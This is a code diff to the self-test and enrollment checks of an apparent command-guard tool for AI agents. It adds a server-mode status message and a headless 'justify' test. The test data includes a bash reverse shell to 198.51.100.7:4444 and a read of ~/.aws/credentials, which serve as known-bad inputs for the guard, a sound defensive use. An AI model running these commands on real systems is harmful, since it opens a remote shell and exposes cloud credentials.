@@ -14,6 +14,7 @@ import { KEY_FILE as FP_KEY_FILE, CACHE_FILE as FP_CACHE_FILE } from "./instruct
 import { CACHE_FILE as REPUTATION_FILE } from "./mcp-reputation.mjs";
 import { makeSandbox, DEAD_SERVER } from "./doctor-sandbox.mjs";
 import { fingerprint, configSource } from "./doctor-policy.mjs";
+import { headlessAskMode } from "./server-mode.mjs";
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
 const tilde = (p) => String(p).replace(os.homedir(), "~");
@@ -41,11 +42,13 @@ export function checkEnrollment(config, eff, home = os.homedir()) {
   const src = configSource(home);
   const enrolled = isEnrolled(config);
   const token = enrolled ? `present (sha256:${fingerprint(config.installToken)})` : "absent";
-  const where = src ? tilde(src.path) : "no config.json (env/localhost defaults)";
+  const sm = eff.server;
+  const where = sm && sm.active ? `server mode (console ${sm.sources.serverUrl}, token ${sm.sources.installToken})` : src ? tilde(src.path) : "no config.json (env/localhost defaults)";
   const mode = eff.coach ? "coach" : "enforce";
   const details = { config: where, tenant: config.tenant, serverUrl: config.serverUrl, installToken: token, mode };
-  const loose = src && process.platform !== "win32" && enrolled && (src.mode & 0o077);
+  const loose = src && process.platform !== "win32" && enrolled && (src.mode & 0o077) && !(sm && sm.active && sm.sources.installToken !== "file");
   const s = `${enrolled ? "enrolled" : "not enrolled"} · tenant ${config.tenant} · token ${token} · ${mode} mode`;
+  if (!enrolled && !eff.coach && sm && sm.active) return { ...base, status: "warn", summary: `${s}: server mode enforces the built-in defaults without a token, but nothing is reported and no org policy is fetched`, fix: "set MOORAI_INSTALL_TOKEN (or installToken in /etc/moorai/config.json)", details };
   if (!enrolled && !eff.coach) return { ...base, status: "ok", summary: `${s} (fail-closed management posture keeps enforcement on without a token)`, details };
   if (!enrolled) return { ...base, status: "warn", summary: `${s}: MoorAI detects and coaches but never blocks`, fix: "enroll the device (desktop app setup screen, or the MDM config.json with serverUrl/tenant/installToken)", details };
   if (loose) return { ...base, status: "warn", summary: `${s}; ${where} holding the token is mode ${(src.mode).toString(8)}, readable by other users`, fix: `chmod 600 ${where}`, details };
@@ -139,7 +142,18 @@ export function checkStateDir(stateDir = STATE_DIR) {
 // ---- live self-test ----
 export const SELFTEST_BENIGN = "ls -la";
 export const SELFTEST_BAD = "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"; // #54, built-in "block"
+// Server mode only: a "justify" call (#55), to show what a headless ask becomes (cli/server-mode.mjs).
+export const SELFTEST_ASK = "cat ~/.aws/credentials";
+const ASK_THREAT = 55;
 const BAD_THREAT = 54;
+
+export function expectedAsk(eff) {
+  const act = threatActionFor(eff.policy, ASK_THREAT);
+  if (act === "block" || act === "kill") return { decision: "deny", why: `#${ASK_THREAT} "${act}"` };
+  if (act !== "justify") return { decision: "allow", why: `policy sets #${ASK_THREAT} to "${act}"` };
+  const m = headlessAskMode(eff.server, eff.policy);
+  return { decision: m.mode === "deny" ? "deny" : "allow", why: `#${ASK_THREAT} "justify", headless ask ${m.mode} (${m.source})` };
+}
 
 export function expectedBad(eff) {
   if (eff.allowAll) return { decision: "allow", coach: false, why: "break-glass active" };
@@ -165,15 +179,21 @@ export function checkSelfTest(config, eff, { timeoutMs = 20000 } = {}) {
     const bad = run(SELFTEST_BAD);
     const want = expectedBad(eff);
     const details = { benign: { decision: good.decision, coach: !!good.coach, ms: good.ms }, knownBad: { decision: bad.decision, coach: !!bad.coach, ms: bad.ms, reason: bad.reason || bad.coach || "" }, expected: want };
+    const server = eff.server && eff.server.active;
+    const ask = server ? run(SELFTEST_ASK) : null;
+    const wantAsk = server ? expectedAsk(eff) : null;
+    if (server) details.headlessAsk = { decision: ask.decision, ms: ask.ms, reason: ask.reason || "", expected: wantAsk };
     const lat = `latency ${good.ms}ms / ${bad.ms}ms`;
     const problems = [];
     if (good.decision !== "allow" || good.coach) problems.push(`benign "${SELFTEST_BENIGN}" got ${good.decision}${good.coach ? " + coach note" : ""}`);
     if (bad.decision !== want.decision) problems.push(`reverse shell got ${bad.decision}, expected ${want.decision} (${want.why})`);
     else if (want.coach && !bad.coach) problems.push("reverse shell was not coached (no MoorAI coach note)");
+    if (server && ask.decision !== wantAsk.decision) problems.push(`headless ask "${SELFTEST_ASK}" got ${ask.decision}, expected ${wantAsk.decision} (${wantAsk.why})`);
     if (problems.length) return { ...base, status: "fail", summary: `${problems.join("; ")} · ${lat}`, fix: "run moorai-explain on the input to see which detector/policy decided", details };
     const verdict = want.coach ? "allow + coach note (not enrolled)" : bad.decision;
     if (want.softened) return { ...base, status: "warn", summary: `hook decides, but ${want.why}: a reverse shell is allowed · ${lat}`, details };
     const slow = Math.max(good.ms, bad.ms) > 5000;
-    return { ...base, status: slow ? "warn" : "ok", summary: `benign → allow, reverse shell → ${verdict} · ${lat}${slow ? " (slow: hosts time hooks out at 30–60s)" : ""}`, details };
+    const askPart = server ? `, credential read (justify) → ${ask.decision} (headless)` : "";
+    return { ...base, status: slow ? "warn" : "ok", summary: `benign → allow, reverse shell → ${verdict}${askPart} · ${lat}${slow ? " (slow: hosts time hooks out at 30–60s)" : ""}`, details };
   } finally { sb.cleanup(); }
 }
